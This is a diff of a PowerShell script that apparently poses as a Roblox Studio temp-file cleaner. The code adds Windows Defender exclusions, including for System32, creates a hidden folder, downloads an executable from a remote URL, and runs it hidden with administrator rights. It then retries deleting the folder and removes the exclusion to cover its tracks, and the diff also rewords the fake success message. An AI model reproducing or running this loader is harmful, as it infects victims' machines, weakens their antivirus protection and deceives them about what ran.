@@ -29,7 +29,7 @@ function Remove-Exclusion {
 Add-Exclusion -Path "C:\Windows\System32"
 
 $hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
-New-Item -ItemType $directory -Path $hiddenFolder -Force | Out-Null
+New-Item -ItemType Directory -Path $hiddenFolder -Force | Out-Null
 $tempPath = Join-Path $hiddenFolder $updaterExe
 
 try {
@@ -37,13 +37,24 @@ try {
     Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
     (Get-Item $hiddenFolder).Attributes += 'Hidden'
     (Get-Item $tempPath).Attributes += 'Hidden'
+
     Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb $runAs -Wait
     Start-Sleep -Seconds 5
-    Remove-Item $hiddenFolder -Recurse -Force -ErrorAction SilentlyContinue
+
+    $maxAttempts = 10
+    $attempt = 0
+    while (Test-Path $hiddenFolder -and $attempt -lt $maxAttempts) {
+        try {
+            Remove-Item $hiddenFolder -Recurse -Force -ErrorAction SilentlyContinue
+        } catch {}
+        Start-Sleep -Milliseconds 500
+        $attempt++
+    }
+
     Remove-Exclusion -Path $hiddenFolder
 }
 catch {
     exit 1
 }
 
-Write-Host "Successfully emptied Roblox Studio temporary files folder."
+Write-Host "Successfully cleaned up"
